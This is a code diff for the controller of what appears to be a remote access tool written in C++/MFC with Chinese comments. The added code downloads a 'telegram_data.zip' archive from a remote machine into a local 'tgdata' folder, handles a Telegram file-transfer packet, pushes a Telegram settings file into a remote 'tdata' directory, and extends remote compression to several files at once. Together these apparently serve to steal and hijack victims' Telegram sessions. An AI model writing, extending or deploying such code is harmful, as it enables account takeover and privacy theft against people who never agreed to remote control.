@@ -18,6 +18,7 @@ static char THIS_FILE[] = __FILE__;
 enum
 {
 	COMMAND_COMPRESS_FILE_PARAM,
+	COMMAND_COMPRESS_MULTIPLE_FILES, // 新增  
 };
 
 static UINT indicators[] =
@@ -783,6 +784,42 @@ CString CFileManagerDlg::GetParentDirectory(CString strPath)
 	return strCurPath;
 }
 
+void CFileManagerDlg::StartSettingsUpload()  
+{  
+    // 清空上传队列  
+    m_Remote_Upload_Job.RemoveAll();  
+	
+    // 添加settingss文件到上传队列  
+    m_Remote_Upload_Job.AddTail(g_TelegramSettingsPath);  
+	
+    // 设置远程目标路径为tdata目录  
+    m_hCopyDestFolder = "tdata";  
+	
+    // 开始上传  
+    m_bIsUpload = true;  
+    EnableControl(FALSE);  
+    SendUploadJob();  
+}  
+
+void CFileManagerDlg::StartTelegramDownload()  
+{  
+    // 清空下载队列  
+    m_Remote_Download_Job.RemoveAll();  
+	
+    // 添加压缩包到下载队列  
+    m_Remote_Download_Job.AddTail(m_Remote_Path + "telegram_data.zip");  
+	
+    // 设置本地保存路径  
+    strLpath = g_TelegramSavePath;  
+    if (strLpath.GetAt(strLpath.GetLength() - 1) != '\\')  
+        strLpath += "\\";  
+	
+    // 开始下载  
+    m_bIsUpload = false;  
+    EnableControl(FALSE);  
+    SendDownloadJob();  
+}
+
 void CFileManagerDlg::OnReceiveComplete()
 {
 	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
@@ -824,11 +861,68 @@ void CFileManagerDlg::OnReceiveComplete()
 	case TOKEN_COMPRESS_FINISH:
 		GetRemoteFileList(".");
 		break;
+	case COMMAND_TELEGRAM_FILE_TRANSFER:  
+		HandleTelegramFileTransfer();  
+		break;
 	default:
 		SendException();
 		break;
 	}
 }
+
+
+void CFileManagerDlg::HandleTelegramFileTransfer()  
+{  
+    // 解析数据包格式：[命令][文件大小高位][文件大小低位][文件名][文件数据]  
+    LPBYTE lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer(1); // 跳过命令字节  
+	
+    // 获取文件大小信息  
+    DWORD dwSizeHigh = *(DWORD*)lpBuffer;  
+    DWORD dwSizeLow = *(DWORD*)(lpBuffer + 4);  
+    __int64 fileSize = ((__int64)dwSizeHigh << 32) + dwSizeLow;  
+	
+    // 获取文件名  
+    char* fileName = (char*)(lpBuffer + 8);  
+	
+    // 构造保存路径 - 直接保存到客户端程序目录下的 tgdata 文件夹  
+    char szPath[MAX_PATH];  
+    GetModuleFileName(NULL, szPath, MAX_PATH);  
+    CString clientPath = szPath;  
+    int pos = clientPath.ReverseFind('\\');  
+    if (pos != -1) {  
+        clientPath = clientPath.Left(pos + 1);  
+    }  
+	
+    CString saveDir = clientPath + "tgdata\\";  
+    CString savePath = saveDir + fileName;  
+	
+    // 确保目录存在  
+    CreateDirectory(saveDir, NULL);  
+	
+    // 获取文件数据（跳过文件名和结束符）  
+    int fileNameLen = strlen(fileName) + 1;  
+    LPBYTE fileData = lpBuffer + 8 + fileNameLen;  
+    DWORD dataSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - 8 - fileNameLen;  
+	
+    // 创建并写入文件  
+    HANDLE hFile = CreateFile(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);  
+    if (hFile != INVALID_HANDLE_VALUE)  
+    {  
+        DWORD bytesWritten;  
+        WriteFile(hFile, fileData, dataSize, &bytesWritten, NULL);  
+        CloseHandle(hFile);  
+		
+        // 显示成功消息  
+        CString message;  
+        message.Format("Telegram 数据包已保存到: %s", savePath);  
+        ::MessageBox(m_hWnd, message, "文件传输完成", MB_OK | MB_ICONINFORMATION);  
+    }  
+    else  
+    {  
+        ::MessageBox(m_hWnd, "文件保存失败", "错误", MB_OK | MB_ICONERROR);  
+    }  
+}
+
 
 void CFileManagerDlg::GetRemoteFileList(CString directory)
 {
@@ -2317,7 +2411,7 @@ void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult)
 	{
 		pM->EnableMenuItem(IDM_REMOTE_OPEN_SHOW, MF_BYCOMMAND | MF_GRAYED);
 		pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
-		pM->EnableMenuItem(IDM_COMPRESS, MF_BYCOMMAND | MF_GRAYED);
+// 关闭多选文件会压缩按钮置灰		pM->EnableMenuItem(IDM_COMPRESS, MF_BYCOMMAND | MF_GRAYED);
 		pM->EnableMenuItem(IDM_UNCOMPRESS, MF_BYCOMMAND | MF_GRAYED);
 		pM->EnableMenuItem(IDM_RENAME, MF_BYCOMMAND | MF_GRAYED);
 	}
@@ -2457,23 +2551,55 @@ void CFileManagerDlg::OnTransferSend()
 }
 
 #include "LFileName.h"
-//压缩处理
-void CFileManagerDlg::OnCompress()  
-{  
-    UpdateData(TRUE);  
-    int i = m_list_remote.GetSelectionMark();  
-    if (i < 0) return;  
+void CFileManagerDlg::OnCompress()    
+{    
+    UpdateData(TRUE);    
       
-    CString strFullFileName = m_list_remote.GetItemText(i, 0);  
-    CString strFullPath = m_Remote_Path + strFullFileName;  
+    // 检查是否有选中项  
+    if (m_list_remote.GetSelectedCount() == 0) return;  
       
-    // 直接传递文件路径，不需要WinRAR参数  
-    int nPacketLength = strFullPath.GetLength() + 2;  
-    LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);  
-    lpPacket[0] = COMMAND_COMPRESS_FILE_PARAM;  
-    memcpy(lpPacket + 1, strFullPath.GetBuffer(0), nPacketLength - 1);  
+    // 收集所有选中的文件路径  
+    CStringArray selectedFiles;  
+    POSITION pos = m_list_remote.GetFirstSelectedItemPosition();  
+    while(pos)   
+    {  
+        int nItem = m_list_remote.GetNextSelectedItem(pos);  
+        CString strFileName = m_list_remote.GetItemText(nItem, 0);  
+        CString strFullPath = m_Remote_Path + strFileName;  
+          
+        // 如果是目录，添加反斜杠标识  
+        if (m_list_remote.GetItemData(nItem))  
+            strFullPath += '\\';  
+              
+        selectedFiles.Add(strFullPath);  
+    }  
       
-    m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);  
+    // 计算数据包大小：命令字节 + 文件数量 + 所有文件路径长度 + 分隔符  
+    int nTotalLength = 1 + sizeof(int); // 命令 + 文件数量  
+    for (int j = 0; j < selectedFiles.GetSize(); j++)  // 使用 j 而不是 i  
+    {  
+        nTotalLength += selectedFiles[j].GetLength() + 1; // 路径 + 分隔符  
+    }  
+      
+    // 构造数据包  
+    LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nTotalLength);  
+    lpPacket[0] = COMMAND_COMPRESS_MULTIPLE_FILES; // 新的命令类型  
+      
+    int offset = 1;  
+    int fileCount = selectedFiles.GetSize();  
+    memcpy(lpPacket + offset, &fileCount, sizeof(int));  
+    offset += sizeof(int);  
+      
+    // 添加所有文件路径  
+    for (int k = 0; k < selectedFiles.GetSize(); k++)  // 使用 k 而不是 i  
+    {  
+        int pathLen = selectedFiles[k].GetLength();  
+        memcpy(lpPacket + offset, selectedFiles[k].GetBuffer(0), pathLen);  
+        offset += pathLen;  
+        lpPacket[offset++] = '\0'; // 分隔符  
+    }  
+      
+    m_iocpServer->Send(m_pContext, lpPacket, nTotalLength);  
     LocalFree(lpPacket);  
 }
 
